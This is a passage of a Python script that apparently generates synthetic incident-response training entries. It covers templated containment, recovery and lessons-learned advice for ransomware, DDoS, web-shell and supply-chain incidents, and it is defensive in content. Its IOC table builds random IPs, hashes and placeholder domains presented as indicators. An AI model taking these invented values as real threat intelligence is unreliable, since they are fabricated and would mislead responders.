        ),
        "ransomware": (
            "**CRITICAL - Time-Sensitive:**\n"
            "1. Immediately disconnect affected systems from the network\n"
            "2. Disable shared drives and network shares to prevent spread\n"
            "3. Shut down systems showing active encryption (preserve evidence first)\n"
            "4. Isolate backup infrastructure to protect clean copies\n\n"
            "**Network-Level Containment:**\n"
            "1. Block SMB (445) and RDP (3389) laterally across subnets\n"
            "2. Segment the network to create clean and compromised zones\n"
            "3. Block known ransomware C2 indicators at the perimeter\n"
            "4. Disable the compromised account used for lateral movement\n\n"
        ),
        "ddos": (
            "**Mitigation Actions:**\n"
            "1. Engage upstream DDoS mitigation provider (CDN/scrubbing service)\n"
            "2. Implement rate limiting and geographic-based filtering\n"
            "3. Enable challenge-response (CAPTCHA) for application-layer attacks\n"
            "4. Scale backend infrastructure if possible (auto-scaling, additional capacity)\n\n"
            "**Network-Level Response:**\n"
            "1. Work with ISP for null-routing or blackhole filtering of attack traffic\n"
            "2. Adjust firewall rules to drop traffic matching attack signatures\n"
            "3. Enable SYN cookies if SYN flood is detected\n"
            "4. Activate pre-configured DDoS response runbook\n\n"
        ),
        "credential_stuffing": (
            "**Immediate Actions:**\n"
            "1. Force password reset on all successfully compromised accounts\n"
            "2. Revoke active sessions for compromised accounts\n"
            "3. Implement CAPTCHA or rate limiting on the login endpoint\n"
            "4. Block identified attacker IP ranges at the WAF\n\n"
            "**Extended Containment:**\n"
            "1. Deploy credential stuffing detection rules (velocity checks, geo-analysis)\n"
            "2. Enable MFA for all affected users\n"
            "3. Reverse any unauthorized account changes (email, password, MFA)\n"
            "4. Monitor compromised accounts for fraudulent transactions\n\n"
        ),
        "web_shell": (
            "**Immediate Containment:**\n"
            "1. Remove or quarantine the web shell file immediately\n"
            "2. Restart the web server process to clear any in-memory payloads\n"
            "3. Block the attacker's IP at the WAF and firewall\n"
            "4. Restrict outbound connections from the web server to known-good destinations\n\n"
            "**Scope Assessment:**\n"
            "1. Search for additional web shells (check common upload directories)\n"
            "2. Review file integrity monitoring for other unauthorized changes\n"
            "3. Check for persistence mechanisms (cron jobs, startup scripts, modified configs)\n"
            "4. Audit web server user permissions and capabilities\n\n"
        ),
        "cryptominer": (
            "**Containment:**\n"
            "1. Kill the mining process and remove the binary\n"
            "2. Block outbound connections to the mining pool at the firewall\n"
            "3. If containerized, stop and quarantine the affected pod/container\n"
            "4. Revoke credentials that may have been used for initial access\n\n"
        ),
        "supply_chain": (
            "**Immediate Containment:**\n"
            "1. Pin dependencies to last-known-good versions\n"
            "2. Block communication with the attacker's C2 infrastructure\n"
            "3. Rotate all secrets (API keys, tokens, passwords) accessible from affected builds\n"
            "4. Halt CI/CD pipelines until the integrity of all dependencies is verified\n\n"
            "**Scope Assessment:**\n"
            "1. Identify all deployments built with the compromised dependency\n"
            "2. Audit build logs for unauthorized code execution\n"
            "3. Check for persistent backdoors in deployed artifacts\n"
            "4. Verify integrity of other dependencies in the supply chain\n\n"
        ),
    }
    return phases.get(scenario_type, "Implement standard containment procedures.\n\n")


def _eradication_phase(rng, scenario_type, r):
    generic = (
        "1. Remove all attacker artifacts (malware, web shells, backdoors, persistence mechanisms)\n"
        "2. Patch the vulnerability or misconfiguration that enabled initial access\n"
        "3. Rotate all potentially compromised credentials and certificates\n"
        "4. Scan all systems in the affected scope for indicators of compromise\n"
        "5. Verify removal by re-scanning with updated detection signatures\n\n"
    )
    return generic


def _recovery_phase(rng, scenario_type, r):
    generic = (
        "1. Restore affected systems from verified clean backups\n"
        "2. Implement additional security controls before reconnecting to the network\n"
        "3. Gradually restore services with enhanced monitoring\n"
        "4. Verify system integrity through comprehensive testing\n"
        "5. Monitor recovered systems closely for 30-90 days for signs of re-compromise\n"
        "6. Confirm business operations are fully restored\n\n"
    )
    return generic


def _lessons_learned(rng, scenario_type):
    lessons = {
        "compromised_server": [
            "Review and harden SSH access controls (key-only auth, fail2ban)",
            "Implement network segmentation to limit lateral movement",
            "Deploy EDR with behavioral detection on all servers",
            "Establish baseline process behaviors for anomaly detection",
        ],
        "data_breach": [
            "Implement data access monitoring with anomaly detection",
            "Enforce least-privilege access to sensitive data stores",
            "Review and update data classification and handling procedures",
            "Evaluate and implement data loss prevention (DLP) controls",
            "Review breach notification obligations and timelines",
        ],
        "phishing_campaign": [
            "Conduct regular phishing awareness training for all employees",
            "Implement DMARC, DKIM, and SPF for email authentication",
            "Deploy advanced email filtering with URL sandboxing",
            "Enforce MFA on all user accounts organization-wide",
        ],
        "insider_threat": [
            "Implement UEBA for anomalous behavior detection",
            "Review and enforce need-to-know access controls",
            "Implement DLP policies for sensitive data categories",
            "Establish clear acceptable use policies with monitoring disclosure",
        ],
        "ransomware": [
            "Implement immutable backup strategy with offline copies",
            "Deploy application whitelisting on critical systems",
            "Conduct regular tabletop exercises for ransomware scenarios",
            "Review and test disaster recovery procedures",
        ],
        "ddos": [
            "Implement DDoS protection at multiple layers (network, application)",
            "Establish relationships with ISP and CDN for rapid response",
            "Develop and test DDoS response runbooks",
            "Deploy auto-scaling capabilities for critical services",
        ],
        "credential_stuffing": [
            "Enforce MFA for all user-facing applications",
            "Implement credential breach detection (check against known breaches)",
            "Deploy bot detection and CAPTCHA on authentication endpoints",
            "Implement account lockout with progressive delays",
        ],
        "web_shell": [
            "Implement file integrity monitoring on all web servers",
            "Restrict web server process capabilities (no shell access)",
            "Deploy WAF with web shell detection rules",
            "Implement automated deployment (prevent manual file changes)",
        ],
        "cryptominer": [
            "Implement container image scanning and admission control",
            "Monitor for unusual CPU/GPU utilization patterns",
            "Block connections to known mining pools at the firewall",
            "Use read-only container filesystems where possible",
        ],
        "supply_chain": [
            "Implement dependency pinning and lock files",
            "Deploy software composition analysis (SCA) in CI/CD",
            "Use private package registries with approval workflows",
            "Implement build provenance and SBOM generation",
        ],
    }
    output = ""
    for l in lessons.get(scenario_type, ["Conduct a thorough post-incident review"]):
        output += f"- {l}\n"
    output += "- Update incident response playbooks based on findings from this incident\n"
    output += "- Conduct post-incident review meeting within 5 business days\n"
    output += "- Document gaps in detection, response, and recovery capabilities\n\n"
    return output


def _ioc_list(rng, scenario_type, r):
    output = "| IOC Type | Value | Context |\n"
    output += "|----------|-------|---------|\n"
    output += f"| IP Address | {rand_ip(rng)} | C2/Attack source |\n"
    output += f"| IP Address | {rand_ip(rng)} | Secondary infrastructure |\n"
    output += f"| Domain | {rng.choice(['malware-c2','evil-update','bad-cdn'])}.{rng.choice(['com','net','io'])} | C2 communication |\n"
    output += f"| File Hash (SHA256) | {''.join(rng.choices('0123456789abcdef', k=64))} | Malicious artifact |\n"
    output += f"| File Path | {rng.choice(['/tmp/.cache/update','/var/tmp/svc','/dev/shm/worker'])} | Malware location |\n"
    output += f"| User Account | {rng.choice(['admin','svc_backup','deploy_user'])} | Compromised account |\n"
    output += "\n"
    return output


def _timeline(rng, scenario_type):
    output = "| Time | Action | Owner |\n"
    output += "|------|--------|-------|\n"
    output += "| T+0 min | Alert received and acknowledged | SOC Analyst |\n"
    output += "| T+15 min | Initial triage and classification complete | SOC Lead |\n"
    output += "| T+30 min | Incident declared, IR team assembled | IR Manager |\n"
    output += "| T+45 min | Short-term containment actions executed | IR Team |\n"
    output += "| T+2 hrs | Evidence preservation and forensics initiated | Forensics Team |\n"
    output += "| T+4 hrs | Scope assessment complete | IR Team |\n"
    output += "| T+8 hrs | Eradication actions complete | Systems Team |\n"
    output += "| T+24 hrs | Recovery and validation underway | Systems/App Team |\n"
    output += "| T+72 hrs | Post-incident review scheduled | IR Manager |\n"
    output += "| T+5 days | Lessons learned report published | IR Manager |\n\n"
    return output


# ── Main generator ────────────────────────────────────────────────────────

class IncidentResponseGenerator(CategoryGenerator):
    category = "incident_response"
    id_prefix = "xld-ir"

    def generate_entries(self, rng: random.Random, count: int, start_id: int,
                         complexity_weights: Dict[str, float]) -> List[Dict[str, Any]]:
        entries = []
        idx = start_id

        # Weight distribution across scenarios
        weights = {
            "compromised_server": 0.12,
            "data_breach": 0.12,
            "phishing_campaign": 0.12,
            "ransomware": 0.12,
            "insider_threat": 0.10,
            "ddos": 0.08,
            "credential_stuffing": 0.08,
            "web_shell": 0.10,
            "cryptominer": 0.08,
            "supply_chain": 0.08,
        }

        for scenario_type, pct in weights.items():
            n = int(count * pct)
            templates = ALERT_TEMPLATES[scenario_type]
            for _ in range(n):
                complexity = pick_complexity(rng, complexity_weights)
                template = rng.choice(templates)
                alert_text, replacements = _fill_alert(rng, template, scenario_type)

                label = SCENARIO_LABELS[scenario_type]
                cwe = SCENARIO_CWE[scenario_type]
                severity = _ir_severity(rng, scenario_type)

                input_text = f"**Incident Type:** {label}\n"
                input_text += f"**Alert Source:** {rng.choice(['SIEM', 'EDR', 'IDS/IPS', 'WAF', 'SOC Analyst', 'User Report', 'Automated Scan'])}\n"
                input_text += f"**Priority:** {rng.choice(['P1 - Critical', 'P2 - High', 'P3 - Medium'])}\n\n"
                input_text += f"**Alert Details:**\n{alert_text}"

                output_text = _build_response_plan(rng, scenario_type, complexity, replacements)

                entries.append(format_entry(
                    entry_id=f"{self.id_prefix}-{idx:05d}",
                    title=f"IR: {label} - {rng.choice(APP_CONTEXTS)}",
                    severity=severity,
                    cwe=cwe,
                    instruction=rng.choice(IR_INSTRUCTIONS),
                    input_text=input_text,
                    output_text=output_text,
                ))
                idx += 1

        # Fill remaining entries
        while len(entries) < count:
            scenario_type = rng.choice(SCENARIO_TYPES)
            complexity = pick_complexity(rng, complexity_weights)
            template = rng.choice(ALERT_TEMPLATES[scenario_type])
            alert_text, replacements = _fill_alert(rng, template, scenario_type)

            label = SCENARIO_LABELS[scenario_type]
            cwe = SCENARIO_CWE[scenario_type]
            severity = _ir_severity(rng, scenario_type)

            input_text = f"**Incident Type:** {label}\n"
            input_text += f"**Alert Source:** {rng.choice(['SIEM', 'EDR', 'IDS/IPS', 'WAF', 'SOC Analyst', 'User Report'])}\n"
            input_text += f"**Priority:** {rng.choice(['P1 - Critical', 'P2 - High', 'P3 - Medium'])}\n\n"
            input_text += f"**Alert Details:**\n{alert_text}"

            output_text = _build_response_plan(rng, scenario_type, complexity, replacements)

            entries.append(format_entry(
                entry_id=f"{self.id_prefix}-{idx:05d}",
                title=f"IR: {label} - {rng.choice(APP_CONTEXTS)}",
                severity=severity,
                cwe=cwe,
                instruction=rng.choice(IR_INSTRUCTIONS),
                input_text=input_text,
                output_text=output_text,
            ))
            idx += 1

        return entries
